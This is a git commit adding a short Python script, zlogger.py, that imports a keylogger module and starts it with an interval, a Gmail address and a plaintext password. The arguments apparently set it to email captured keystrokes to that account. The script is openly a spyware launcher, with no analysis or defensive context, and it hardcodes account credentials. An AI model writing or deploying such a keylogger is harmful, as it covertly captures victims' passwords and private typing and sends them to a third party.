d376031f22beb17640532e98776cea211a313b39
Navdeep Maan <74094247+djmaan@users.noreply.github.com>
2021-02-13 23:01:06 +0530

    logger

---
+++ zlogger.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Created on Tue Aug 18 17:18:41 2020
+
+@author: djmaan
+"""
+
+
+import keylogger
+
+my_keylogger = keylogger.Keylogger(4, "jhnwck70@gmail.com", "12345678")
+my_keylogger.start()
